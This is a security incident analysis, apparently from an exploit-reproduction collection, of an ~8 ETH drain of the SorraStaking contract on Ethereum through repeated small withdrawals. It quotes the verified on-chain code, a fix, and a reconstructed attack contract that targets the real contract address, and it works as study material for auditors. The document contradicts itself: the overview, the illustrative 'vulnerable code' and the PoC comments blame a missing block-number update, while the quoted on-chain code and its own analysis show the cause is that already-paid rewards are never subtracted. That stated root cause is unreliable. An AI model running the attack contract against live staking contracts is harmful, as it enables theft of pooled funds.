# SorraStaking — Staking Reward Calculation Bug Analysis

| Field | Details |
|------|------|
| **Date** | 2025-01-08 |
| **Protocol** | SorraStaking (SOR Token) |
| **Chain** | Ethereum |
| **Loss** | ~8 ETH |
| **Attacker** | Unidentified (EOA not publicly confirmed) |
| **Attack Tx** | [0x6439...90d](https://etherscan.io/tx/0x6439d63cc57fb68a32ea8ffd8f02496e8abad67292be94904c0b47a4d14ce90d) |
| **Vulnerable Contract** | [0x5d16b8Ba...](https://etherscan.io/address/0x5d16b8Ba2a9a4ECA6126635a6FFbF05b52727d50) |
| **Root Cause** | During staking reward calculation, only the block timestamp was updated while the block number was not, causing accumulated reward errors on repeated withdrawals |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-01/sorraStaking.sol) |

---

## 1. Vulnerability Overview

The SorraStaking contract used both the block timestamp (`block.timestamp`) and block number (`block.number`) when calculating staking rewards. However, as confirmed through testing, a bug existed in the actual implementation where only the timestamp was updated while the block number was not. The attacker deposited approximately 122 billion SOR tokens, let 14 days elapse, and repeatedly called `withdraw(1)` 800 times to accumulate far more rewards than intended.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: only timestamp updated, block number missing
function withdraw(uint256 amount) external {
    UserInfo storage user = userInfo[msg.sender];
    uint256 reward = calculateReward(user);

    // Timestamp is updated
    user.lastRewardTime = block.timestamp;
    // ❌ block.number update missing → block-number-based calculation becomes incorrect on next call
    // user.lastRewardBlock = block.number;  ← absent

    user.amount -= amount;
    sor.transfer(msg.sender, amount + reward);
}

// ✅ Safe code: both timestamp and block number updated
function withdraw(uint256 amount) external {
    UserInfo storage user = userInfo[msg.sender];
    uint256 reward = calculateReward(user);

    user.lastRewardTime = block.timestamp;
    user.lastRewardBlock = block.number;  // ← must be updated

    user.amount -= amount;
    sor.transfer(msg.sender, amount + reward);
}
```

### On-Chain Original Code

Source: **Sourcify-verified** — contracts/sorraStaking.sol / 0x5d16b8Ba2a9a4ECA6126635a6FFbF05b52727d50 (Ethereum)
https://sourcify.dev/server/files/any/1/0x5d16b8Ba2a9a4ECA6126635a6FFbF05b52727d50

```solidity
// State variables relevant to the exploit
struct Deposit {
    uint256 amount;       // remaining token amount in this deposit slot
    uint256 depositTime;  // timestamp when deposit was made
    uint8 tier;
    uint256 rewardBps;    // reward rate in basis points
}

struct Position {
    Deposit[] deposits;
    uint256 totalAmount;
}

mapping(address => Position) public positions;
mapping(address => uint256) public userRewardsDistributed; // tracks paid rewards

// -------------------------------------------------------------------------

function withdraw(uint256 _amount) external nonReentrant {
    require(_amount > 0, "Amount must be greater than 0");
    Position storage position = positions[_msgSender()];
    require(_amount <= position.totalAmount, "Insufficient balance");

    uint256 withdrawableAmount = 0;
    for (uint256 i = 0; i < position.deposits.length; i++) {
        Deposit memory dep = position.deposits[i];
        if (block.timestamp > dep.depositTime + vestingTiers[dep.tier].period) {
            withdrawableAmount += dep.amount;
        }
    }
    require(withdrawableAmount >= _amount, "Lock period not finished");

    uint256 rewardAmount = getPendingRewards(_msgSender()); // ❌ always returns FULL reward

    _updatePosition(_msgSender(), _amount, true, position.deposits[0].tier);
    // ❌ _decreasePosition subtracts only _amount from dep.amount,
    //    but does NOT record that the reward was already paid for the remaining balance.

    if (rewardAmount > 0) {
        userRewardsDistributed[_msgSender()] += rewardAmount;
        totalRewardsDistributed += rewardAmount;
        IERC20(rewardToken).safeTransfer(_msgSender(), _amount + rewardAmount);
        emit RewardDistributed(_msgSender(), rewardAmount);
    } else {
        IERC20(rewardToken).safeTransfer(_msgSender(), _amount);
    }
}

function getPendingRewards(address wallet) public view returns (uint256) {
    if (positions[wallet].totalAmount == 0) {
        return 0;
    }
    return _calculateRewards(positions[wallet].totalAmount, wallet);
    // ❌ returns _calculateRewards result; does NOT subtract userRewardsDistributed[wallet]
}

function _calculateRewards(uint256 /* unusedParam */, address wallet) internal view returns (uint256) {
    Position storage pos = positions[wallet];
    uint256 length = pos.deposits.length;
    if (length == 0) return 0;

    uint256 totalRewards = 0;
    uint256 currentTime = block.timestamp;

    for (uint256 i = 0; i < length; i++) {
        Deposit storage dep = pos.deposits[i];
        uint256 timeElapsed = currentTime - dep.depositTime; // ❌ always from original depositTime
        uint256 vestingTime = vestingTiers[dep.tier].period;

        if (timeElapsed >= vestingTime) {
            uint256 rewardAmount = (dep.amount * dep.rewardBps) / 10000; // ❌ full reward on remaining amount
            totalRewards += rewardAmount;
        }
    }

    return totalRewards;
}
```

**Why it is exploitable (identify the bug from the code):**

- `_calculateRewards` computes a flat reward as `dep.amount * dep.rewardBps / 10000` — it is a one-time bonus, not a rate-per-second formula. The function does not track whether this reward was already distributed.
- `getPendingRewards` returns `_calculateRewards(...)` **without subtracting** `userRewardsDistributed[wallet]`. So each call returns the same gross reward regardless of how many times it has already been paid out.
- `withdraw(1)` deducts only 1 token unit from `dep.amount` via `_decreasePosition`. On the next call, `dep.amount` is almost unchanged, so `_calculateRewards` returns nearly the same large reward again.
- An attacker who deposited a large balance (e.g. 122 billion SOR) and waited for the vesting period to elapse can call `withdraw(1)` hundreds of times, collecting the full reward amount on each call because neither the reward calculation nor the pending-rewards query accounts for previously paid rewards.

```solidity
// ✅ Fix: subtract already-distributed rewards from getPendingRewards
function getPendingRewards(address wallet) public view returns (uint256) {
    if (positions[wallet].totalAmount == 0) return 0;
    uint256 gross = _calculateRewards(positions[wallet].totalAmount, wallet);
    // ✅ never pay more than what has not yet been distributed
    if (gross <= userRewardsDistributed[wallet]) return 0;
    return gross - userRewardsDistributed[wallet];
}
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─→ [1] Deposit ~122 billion SOR tokens (tier 0)
  │
  ├─→ [2] vm.warp(+14 days) — simulate 14-day elapsed time
  │
  ├─→ [3] withdraw(1) × 800 repeated calls
  │         └─ each call resets only the timestamp
  │            block number not updated → reward recalculation overpays
  │
  ├─→ [4] Accumulated SOR tokens → swapped to ETH via Uniswap V2
  │
  └─→ [5] ~8 ETH obtained
```

## 4. PoC Code (Core Logic + Comments)

```solidity
// Full PoC not available — reconstructed from summary

contract SorraAttacker {
    address constant SOR = 0xE021bAa5b70C62A9ab2468490D3f8ce0AfDd88dF;
    address constant STAKING = 0x5d16b8Ba2a9a4ECA6126635a6FFbF05b52727d50;

    function attack() external {
        // [1] Deposit large amount of SOR (tier 0)
        uint256 depositAmount = 122_000_000_000 * 1e18; // 122 billion SOR
        IERC20(SOR).approve(STAKING, depositAmount);
        ISorStaking(STAKING).deposit(depositAmount, 0); // tier 0

        // [2] Advance 14 days (using vm.warp)
        // vm.warp(block.timestamp + 14 days);

        // [3] Withdraw small amount 800 times
        //     Block number not updated → rewards recalculated on every call
        for (uint256 i = 0; i < 800; i++) {
            ISorStaking(STAKING).withdraw(1); // withdraw 1 unit at a time
        }

        // [4] Accumulated SOR → swap to ETH
        uint256 sorBalance = IERC20(SOR).balanceOf(address(this));
        // Convert to ETH via Uniswap V2
        // ...

        // Result: ~8 ETH obtained
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | Reward Calculation Flaw |
| **CWE** | CWE-682: Incorrect Calculation |
| **Attack Vector** | External (repeated function calls) |
| **DApp Category** | Staking Protocol |
| **Impact** | Over-withdrawal of staking pool reward assets |

## 6. Remediation Recommendations

1. **Complete State Variable Updates**: All state variables used in reward calculation (`block.timestamp`, `block.number`, etc.) must be updated after every interaction
2. **Reward Cap**: Limit the maximum reward that a single transaction or single user can withdraw
3. **Repeated Call Defense**: Limit the number of repeated withdrawals by the same user within a given time window or block range
4. **Comprehensive Unit Tests**: Write fuzz tests covering repeated withdrawal scenarios

## 7. Lessons Learned

- When reward calculation depends on multiple state variables, failing to update even one of them can result in a critical vulnerability.
- Cumulative attacks via many small repeated transactions are harder to detect than a single large-scale attack.
- Block timestamp and block number are managed independently — advancing the timestamp with `vm.warp` in a test environment does not automatically increment the block number, and developers must be aware of this distinction.